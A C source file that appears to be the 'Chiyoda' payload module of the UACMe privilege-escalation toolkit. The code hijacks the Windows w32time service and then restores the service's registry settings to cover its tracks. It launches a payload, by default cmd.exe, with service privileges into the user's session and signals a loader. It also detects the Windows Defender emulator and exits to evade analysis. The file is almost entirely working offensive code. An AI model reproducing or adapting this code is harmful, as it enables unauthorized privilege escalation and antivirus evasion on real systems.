/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2019
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.17
*
*  DATE:        20 Mar 2019
*
*  Chiyoda entry point.
*
*  Can be built as exe or dll.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//#define _TRACE_CALL
#undef _TRACE_CALL

#if !defined UNICODE
#error ANSI build is not supported
#endif

#include "shared\shared.h"
#include "shared\libinc.h"

#define LoadedMsg      L"Chiyoda lock and loaded"

#define g_ServiceName  L"w32time"

static BOOL                  g_IsEXE = FALSE;
static SERVICE_STATUS_HANDLE g_ssh = NULL;
static SERVICE_STATUS        g_ServiceStatus = { 0, 0, 0, 0, 0, 0, 0 };

HANDLE                       g_hSvcStopEvent = NULL;

VOID ReportSvcStatus(_In_ DWORD, _In_ DWORD, _In_ DWORD);
DWORD SvcCtrlHandler(_In_ DWORD, _In_ DWORD, _In_ LPVOID, _In_ LPVOID);

static const UNICODE_STRING  g_usW32TimeRoot = RTL_CONSTANT_STRING(
    L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time");

static const WCHAR g_svcParameters[]            = { L"Parameters" };
static const WCHAR g_svcType[]                  = { L"Type" };
static const WCHAR g_svcImagePath[]             = { L"ImagePath" };
static const WCHAR g_svcRequiredPrivileges[]    = { L"RequiredPrivileges" };
static const WCHAR g_svcObjectName[]            = { L"ObjectName" };
static const WCHAR g_svcServiceDll[]            = { L"ServiceDll" };

UACME_PARAM_BLOCK g_SharedParams;


/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* RevertServiceParams
*
* Purpose:
*
* Restore original service parameters state.
*
*/
VOID RevertServiceParams()
{
    NTSTATUS Status;
    HANDLE hKey = NULL, hSubKey = NULL;

    ULONG DataSize = 0, Length, ServiceType;

    PWSTR Ptr;

    WCHAR Data[200];

    UNICODE_STRING us;

    PWSTR RequiredPrivileges = L"SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeCreateGlobalPrivilege\0SeSystemTimePrivilege\0\0";

    OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES(&g_usW32TimeRoot, OBJ_CASE_INSENSITIVE);

    Status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
    if (NT_SUCCESS(Status)) {

        //
        // Revert ObjectName
        //
        RtlSecureZeroMemory(&Data, sizeof(Data));

        _strcpy(Data, L"NT AUTHORITY\\LocalService");
        DataSize = (ULONG)((1 + _strlen(Data)) * sizeof(WCHAR));
        RtlInitUnicodeString(&us, g_svcObjectName);
        Status = NtSetValueKey(hKey, &us, 0, REG_SZ, (PVOID)&Data, DataSize);
        if (NT_SUCCESS(Status)) {
            
            //
            // Revert RequiredPrivileges
            //
            Ptr = RequiredPrivileges;
            DataSize = 0;

            while (*Ptr) {
                Length = (ULONG)_strlen(Ptr) + 1;
                Ptr = Ptr + Length;
                DataSize += Length;
            }

            DataSize = (DataSize * sizeof(WCHAR)) + sizeof(UNICODE_NULL);

            RtlInitUnicodeString(&us, g_svcRequiredPrivileges);
            Status = NtSetValueKey(hKey, &us, 0, REG_MULTI_SZ, RequiredPrivileges, DataSize);
            if (NT_SUCCESS(Status)) {

                if (g_IsEXE) {
                    
                    //
                    // Revert ImagePath
                    //
                    RtlInitUnicodeString(&us, g_svcImagePath);
                    RtlSecureZeroMemory(&Data, sizeof(Data));
                    _strcpy(Data, L"%SystemRoot%\\system32\\svchost.exe -k LocalService");
                    DataSize = (ULONG)((1 + _strlen(Data)) * sizeof(WCHAR));
                    Status = NtSetValueKey(hKey, &us, 0, REG_EXPAND_SZ, (PVOID)&Data, DataSize);
                    if (NT_SUCCESS(Status)) {
                        
                        //
                        // Revert Type
                        //
                        RtlInitUnicodeString(&us, g_svcType);
                        ServiceType = SERVICE_WIN32_SHARE_PROCESS;
                        DataSize = sizeof(ULONG);
                        Status = NtSetValueKey(hKey, &us, 0, REG_DWORD, (PVOID)&ServiceType, DataSize);
                    }
                }
                else {
                    
                    //
                    // Revert ServiceDll
                    //
                    RtlInitUnicodeString(&us, g_svcParameters);
                    obja.ObjectName = &us;
                    obja.RootDirectory = hKey;

                    Status = NtOpenKey(&hSubKey, KEY_ALL_ACCESS, &obja);
                    if (NT_SUCCESS(Status)) {
                        RtlSecureZeroMemory(&Data, sizeof(Data));
                        _strcpy(Data, L"%systemroot%\\system32\\w32time.dll");
                        DataSize = (ULONG)((1 + _strlen(Data)) * sizeof(WCHAR));
                        RtlInitUnicodeString(&us, g_svcServiceDll);
                        Status = NtSetValueKey(hSubKey, &us, 0, REG_EXPAND_SZ, (PVOID)&Data, DataSize);
                        NtClose(hSubKey);
                    }
                }
            }
        }
        NtClose(hKey);
    }

#ifdef _TRACE_CALL
    if (NT_SUCCESS(Status))
        OutputDebugString(L"service>>revert complete\r\n");
    else
    {
        _strcpy(Data, L"service>>revert status = 0x");
        ultohex(Status, _strend(Data));
        _strcat(Data, L"\r\n");
        OutputDebugString(Data);
    }
#endif
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;
    ULONG SessionId;

#ifdef _TRACE_CALL
    WCHAR szDebug[100];
#endif

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        SessionId = g_SharedParams.SessionId;
    }
    else {
        lpParameter = NULL;
        cbParameter = 0UL;
        SessionId = 0;
    }

#ifdef _TRACE_CALL
    _strcpy(szDebug, L"service>>SessionId=");
    ultostr(SessionId, _strend(szDebug));
    OutputDebugString(szDebug);
#endif

    ucmLaunchPayload2(
        TRUE, //because we are running as service
        SessionId,
        lpParameter,
        cbParameter);

#ifdef _TRACE_CALL
    OutputDebugString(L"service>>pingback\r\n");
#endif

    ucmPingBack();

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

#ifdef _TRACE_CALL
    OutputDebugString(L"service>>stopping\r\n");
#endif

    SetEvent(g_hSvcStopEvent);
}

/*
* ReportSvcStatus
*
* Purpose:
*
* Sets the current service status and reports it to the SCM.
*
*/
VOID ReportSvcStatus(
    _In_ DWORD dwCurrentState,
    _In_ DWORD dwWin32ExitCode,
    _In_ DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    g_ServiceStatus.dwCurrentState = dwCurrentState;
    g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    g_ServiceStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        g_ServiceStatus.dwControlsAccepted = 0;
    else
        g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) ||
        (dwCurrentState == SERVICE_STOPPED))
        g_ServiceStatus.dwCheckPoint = 0;
    else g_ServiceStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(g_ssh, &g_ServiceStatus);
}

/*
* SvcCtrlHandler
*
* Purpose:
*
* Service control handler.
*
*/
DWORD SvcCtrlHandler(
    _In_ DWORD dwControl,
    _In_ DWORD dwEventType,
    _In_ LPVOID lpEventData,
    _In_ LPVOID lpContext
)
{
    UNREFERENCED_PARAMETER(dwEventType);
    UNREFERENCED_PARAMETER(lpEventData);
    UNREFERENCED_PARAMETER(lpContext);

    switch (dwControl) {
    case SERVICE_CONTROL_STOP:

        ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

        SetEvent(g_hSvcStopEvent);

        ReportSvcStatus(g_ServiceStatus.dwCurrentState, NO_ERROR, 0);
        break;

    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
    return NO_ERROR;
}

/*
* ServiceMain
*
* Purpose:
*
* Service entry point.
*
*/
VOID WINAPI ServiceMain(
    _In_ DWORD  dwArgc,
    _In_ LPTSTR *lpszArgv
)
{
    UNREFERENCED_PARAMETER(dwArgc);
    UNREFERENCED_PARAMETER(lpszArgv);

#ifdef _TRACE_CALL
    OutputDebugString(L"service>>ServiceMain\r\n");
#endif

    g_ssh = RegisterServiceCtrlHandlerEx(
        (LPCWSTR)g_ServiceName,
        SvcCtrlHandler,
        NULL);

    if (g_ssh == NULL) {
        return;
    }

    RtlSecureZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));

    if (g_IsEXE)
        g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    else
        g_ServiceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    //
    // Notification event about service stop.
    //
    g_hSvcStopEvent = CreateEvent(
        NULL,
        TRUE,
        FALSE,
        NULL);

    if (g_hSvcStopEvent == NULL) {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    RevertServiceParams();
    DefaultPayload();

    while (TRUE) {
        WaitForSingleObject(g_hSvcStopEvent, INFINITE);
#ifdef _TRACE_CALL
        OutputDebugString(L"service>>stopped");
#endif
        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }
}

/*
* ChiyodaMain
*
* Purpose:
*
* Executable mode entry point.
*
*/
__declspec(dllexport) VOID WINAPI ChiyodaMain(
    _In_ DWORD  dwArgc,
    _In_ LPTSTR *lpszArgv)
{
    UNREFERENCED_PARAMETER(dwArgc);
    UNREFERENCED_PARAMETER(lpszArgv);

    SERVICE_TABLE_ENTRY DispatchTable[] =
    {
        { g_ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
  
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        ExitProcess((UINT)-2); 

    g_IsEXE = TRUE;
    StartServiceCtrlDispatcher((SERVICE_TABLE_ENTRY*)&DispatchTable);
}

/*
* DllMain
*
* Purpose:
*
* Dll entry point.
*
*/
#pragma comment(linker, "/SUBSYSTEM:CONSOLE /ENTRY:DllMain")
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        OutputDebugString(LoadedMsg);
    }

    DisableThreadLibraryCalls(hinstDLL);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        ExitProcess((UINT)-1);

    return TRUE;
}
